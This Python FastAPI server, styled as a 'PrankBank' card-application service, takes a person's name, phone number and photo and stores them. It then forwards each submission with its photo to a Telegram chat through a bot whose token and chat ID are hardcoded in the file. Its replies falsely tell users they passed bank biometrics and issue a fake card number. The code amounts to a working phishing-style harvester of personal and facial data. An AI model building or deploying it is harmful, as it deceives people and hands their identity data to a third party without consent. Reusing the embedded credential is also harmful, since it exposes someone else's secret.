from fastapi import FastAPI, Form, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
import sqlite3
import os
import uuid
import random
from datetime import datetime
import httpx
import asyncio

app = FastAPI(title="PrankBank API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
DB_PATH = os.path.join(BASE_DIR, "orders.db")
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Telegram настройки (устанавливаешь сам)
TELEGRAM_BOT_TOKEN = os.getenv(
    "TELEGRAM_BOT_TOKEN", "8863647309:AAEGf4IRdCO5CU-zECHmwjkeC7ifh8PQzg8"
)
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "1052167070")


def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS orders (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            phone TEXT,
            photo_path TEXT,
            created_at TEXT
        )
        """
    )
    conn.commit()
    conn.close()


init_db()

FUNNY_MESSAGES = [
    "🏦 Служба безопасности впечатлена вашей позой. Карта одобрена!",
    "🔥 Вы прошли биометрию с первого раза. Это редкость. Карта в пути!",
]


async def send_to_telegram(name: str, phone: str, photo_path: str):
    """Отправляет фото и данные в Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return

    try:
        with open(photo_path, "rb") as photo_file:
            caption = (
                f"📝 *Новая заявка на карту*\n\n👤 Имя: {name}\n📱 Телефон: {phone}"
            )

            async with httpx.AsyncClient() as client:
                await client.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
                    data={
                        "chat_id": TELEGRAM_CHAT_ID,
                        "caption": caption,
                        "parse_mode": "Markdown",
                    },
                    files={"photo": photo_file},
                )
    except Exception as e:
        print(f"Telegram error: {e}")


@app.get("/")
async def root():
    # Отдаём фронтенд из соседнего файла
    return FileResponse(os.path.join(BASE_DIR, "index.html"))


@app.post("/api/order-card")
async def order_card(
    name: str = Form(...),
    phone: str = Form(...),
    photo: UploadFile = File(...),
):
    ext = os.path.splitext(photo.filename or "photo.jpg")[1] or ".jpg"
    filename = f"{uuid.uuid4().hex}{ext}"
    filepath = os.path.join(UPLOAD_DIR, filename)

    content = await photo.read()
    with open(filepath, "wb") as f:
        f.write(content)

    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO orders (name, phone, photo_path, created_at) VALUES (?, ?, ?, ?)",
        (name, phone, filepath, datetime.now().isoformat()),
    )
    conn.commit()
    conn.close()

    # Отправляем в Telegram асинхронно (не ждём)
    asyncio.create_task(send_to_telegram(name, phone, filepath))

    return JSONResponse(
        {
            "success": True,
            "message": random.choice(FUNNY_MESSAGES),
            "card_number": f"1337-{uuid.uuid4().hex[:4].upper()}-PRANK",
        }
    )


if __name__ == "__main__":
    import uvicorn

    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
